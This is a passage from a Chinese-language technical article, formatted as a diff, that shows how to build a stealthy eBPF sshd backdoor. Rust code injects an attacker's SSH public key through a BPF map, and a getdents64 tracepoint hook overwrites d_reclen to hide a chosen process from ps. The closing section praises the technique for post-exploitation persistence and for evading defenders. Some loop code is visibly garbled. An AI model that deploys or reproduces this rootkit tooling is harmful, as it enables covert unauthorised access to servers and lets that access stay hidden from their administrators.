@@ -1,0 +1,155 @@
+        SkeletonBuilder::new()
+            .source(SRC)
+            .build_and_generate(&out)
+            .unwrap();
+在build.rs中编译对应的c文件到生成backdoor.skel.rs
+    fn main() -> Result  {
+        let mut skel_builder = BackdoorSkelBuilder::default();
+        skel_builder.obj_builder.debug(true);
+        let open_skel = skel_builder.open()?;
+        // Begin tracing
+        let mut skel = open_skel.load()?;
+        skel.attach()?;
+        loop {
+        }
+    }
+通过builder生成对应的skel，调用load和attach进行挂载，当然这里需要loop阻塞一下，不然就直接退出了。
+用户态可以监听perfbuf和ringbuffer这两个map，以ringbuffer为例
+    let mut builder = RingBufferBuilder::new();
+        builder.add(skel.maps_mut().rb(), rb_handler).expect("Failed to add ringbuf");
+        let ringbuf = builder.build().expect("Failed to build");
+        loop {
+            ringbuf.poll(Duration::from_millis(100))?;
+        }
+rb_handler就是对应的处理函数
+也可以修改其他的map，比如这里向map里传入我们自定义的公钥内容
+    //Replace your pub key here
+        let val = CustomPayload::new(b"\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC31FcYRWU1GQi6r0jLHwm7Ko9j8WaWFC9Y4RbRjbrRbx22HS/ZWhUr2mKtYR//QxhsP4uMzWOJka+yxxBhTo6GPJboMWrkPMr0R23+cXG2SIub/BeZqNe7qDOadp9Ng/ovzEWtpCQhtkrDSv+98RuHfNCngdpIjPDzf11k+GNNKwGtltO5YmUay/tqVrm8AsnmKhB7Xe0kuNPzHQVTWFB46k6xeWs/0NqHETmYxFznCYxGXYPX7+QMdGPZVvG2MLAxAUN/i6x7oygD6AGYTk9iQyAG/1TTgzSMWVXGC+8ZoSMQCxwNKpVl2Tqf79CmKjo6aTsJOihCtmSMoRRvr9vz9p/KYrSH5pSYbblKQHlYQRqFlaPRsqK13/oRE2cgVu0cU+hMSfMW+COYez0k82S0fck9BdEhU6PLyFby3fs7QHedeKvR6bKGh7kAsTnIbvJNx0VHQ/0X2Tcf0exW8oYFGMq41/aIWfCvjAyHtf66NqbrtIxD11AJjgmf8pgcR80= eki@DUBHE-VM\n");
+        let key = (0 as u8).to_ne_bytes();
+        //let val = custom_key;
+        unsafe {
+            if let Err(e) = skel.maps_mut().map_payload_buffer().update(&key, plain::as_bytes(&val), MapFlags::ANY){
+                panic!("{}",e)
+            }
+        }
+这里的结构推荐用Plain来完成从[u8]到结构的序列化和反序列化，比如我们存储的CustomPayload，可以这么写（注意空间和长度需要固定）
+    #[derive(Debug, Clone)]
+    pub struct CustomPayload {
+        pub raw_buf: [u8; MAX_PAYLOAD_LEN],
+        pub payload_len: u32,
+    }
+    impl CustomPayload {
+        pub fn new(buf:&[u8;A])->Self{
+            CustomPayload {
+                raw_buf: pad_zeroes(*buf),
+                payload_len: buf.len() as u32,
+            }
+        }
+    }
+    unsafe impl Plain for CustomPayload{}
+效果如下
+## FILE_CLOAK
+上面我们通过ebPF实现了一个sshd backdoor。其实它还不够隐蔽，比如这个进程会显示在进程树中，通过ps命令可以很容易的排查出可疑进程。
+在linux下，我们排查系统运行的进程实际上是通过访问`/proc`伪文件系统实现的，包括ps命令,我们可以通过strace来查看ps使用的系统调用来验证这一说法。
+    > strace -e openat ps
+    ...
+    openat(AT_FDCWD, "/proc/meminfo", O_RDONLY) = 4
+    openat(AT_FDCWD, "/proc", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 5
+    openat(AT_FDCWD, "/proc/1/stat", O_RDONLY) = 6
+    openat(AT_FDCWD, "/proc/1/status", O_RDONLY) = 6
+    openat(AT_FDCWD, "/proc/2/stat", O_RDONLY) = 6
+    openat(AT_FDCWD, "/proc/2/status", O_RDONLY) = 6
+    openat(AT_FDCWD, "/proc/3/stat", O_RDONLY) = 6
+    openat(AT_FDCWD, "/proc/3/status", O_RDONLY) = 6
+    openat(AT_FDCWD, "/proc/4/stat", O_RDONLY) = 6
+    openat(AT_FDCWD, "/proc/4/status", O_RDONLY) = 6
+    openat(AT_FDCWD, "/proc/5/stat", O_RDONLY) = 6
+    ...
+那么，很自然的会想到利用上一篇文章中说的，让ps读不到对应的文件就可以使进程不出现在列表中。然而进程对应的是一个目录而非文件，我们可能需要劫持目录下的所有文件。因此，我们不妨换一个思路，通过`getdents`系统调用来篡改目录。现代linux系统使用的调用为`getdents64`，对应的原型和参数结构如下
+    int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+    //其中
+    struct linux_dirent64 {
+        u64        d_ino;    /* 64-bit inode number */
+        u64        d_off;    /* 64-bit offset to next structure */
+        unsigned short d_reclen; /* Size of this dirent */
+        unsigned char  d_type;   /* File type */
+        char           d_name[]; /* Filename (null-terminated) */ };
+我们也可以验证ps中确实使用了这一系统调用
+    trace -e getdents64 ps
+    getdents64(5, 0x55e5e2a6d380 /* 324 entries */, 32768) = 8832
+        PID TTY          TIME CMD
+      46489 pts/17   00:00:01 bash
+      57392 pts/17   00:00:00 strace
+      57395 pts/17   00:00:00 ps
+    getdents64(5, 0x55e5e2a6d380 /* 0 entries */, 32768) = 0
+    +++ exited with 0 +++
+## 隐藏流程
+对于正常读取文件：
+`linux_dirent64` 结构体在内存的排列是连续的，而且 `sys_getdents64`的第二个参数 dirent 正好指向第一个
+`linux_dirent64` 结构体，所以根据上面的信息，我们只要知道 `linux_dirent64` 链表的大小，就能根据
+`linux_dirent64->d_reclen`，就能准确从连续的内存中分割出每一块`linux_dirent64`。
+那么隐藏的思路就是：
+通过修改前一块`linux_dirent64->d_reclen` 为下一块的`d_reclen`+这一块的`d_reclen`
+这样读取文件是就会跳过这一部分直接到下一块。
+## 具体实现
+具体代码也用libbpf-rust实现了一版
+主要是对`SEC("tracepoint/syscalls/sys_exit_getdents64")`的hook
+首先是遍历`linux_dirent64`
+结构体，找到对应的目录，这里通过尾调用的方式绕过eBPF对循环的限制，具体来说就是将原来的循环拆分成大小为128的块，一轮循环结束后，记录当前遍历的位置`bpos`，通过bpf_tail_call再次调用这个函数进行遍历，直到找到对应的文件名。
+    int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
+    {
+            ...
+        long unsigned int buff_addr = *pbuff_addr;
+        struct linux_dirent64 *dirp = 0;
+        int pid = pid_tgid >> 32;
+        short unsigned int d_reclen = 0;
+        char filename[MAX_FILE_LEN];
+        unsigned int bpos = 0;
+        unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
+        if (pBPOS != 0) {
+            bpos = *pBPOS;
+        }
+        for (int i = 0; i = total_bytes_read) {
+                break;
+            }
+            dirp = (struct linux_dirent64 *)(buff_addr+bpos);
+            bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
+            bpf_probe_read_user_str(&filename, sizeof(filename), dirp->d_name);
+            int j = 0;
+            for (j = 0; j d_reclen);
+        struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);
+        unsigned short d_reclen = 0;
+        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
+        short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
+        long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
+            ...
+        bpf_map_delete_elem(&map_to_patch, &pid_tgid);
+        return 0;
+    }
+用户态的实现也是类似的,注意我们可以直接修改bpf字节码中的rodata段来存储我们想要的目标文件名。
+    open_skel.rodata().file_to_hide_len = target_folder.as_bytes().len() as i32;
+    open_skel.rodata().file_to_hide[..target_folder.as_bytes().len()].copy_from_slice(target_folder.as_bytes());
+最终效果如下
+    > ps aux |grep listen.py
+    eki        63504  0.0  0.0  91636  5876 pts/32   Sl+  Feb15   0:00 python listen.py
+    eki        82405  0.0  0.0   7012  2140 pts/35   S+   01:33   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox listen.py
+    ---    > sudo target/debug/file_cloak 63504
+    --- 
+    > ps aux |grep listen.py
+    eki        82302  0.0  0.0   7012  2228 pts/35   S+   01:33   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox listen.py
+## 总结
+在本文中，我们实际上利用eBPF机制实现了两个Gadget：
+  * 通过劫持openat和read系统调用实现任意程序读取文件内容劫持
+  * 通过劫持getdents64系统调用实现任意程序列目录劫持
+通过这两个Gadget就能实现一个隐蔽的sshd后门。当然也可以开发出更多的玩法。
+### 优点和劣势
+优点：
+  * 文件痕迹上足够隐蔽，如果蓝队不查看可疑的bpf进程的话，由于这种方式并不会对磁盘上的文件造成影响，很难检测到添加了公钥，也很难修复。
+  * 行为痕迹上足够隐蔽，全程的行为都是正常的，攻击者只是正常的使用公钥连接目标服务器。同时后门进程也不会出现在进程树中。
+劣势：
+  * ebpf需要root权限才能执行。因此只能应用于渗透提权后的权限维持。
+  * 由于ebpf本身的特性，后门程序对目标系统内核版本的要求比较高，无法运行在较低的内核版本上。
+## 参考资料
+  * 
+  * 
+  * 
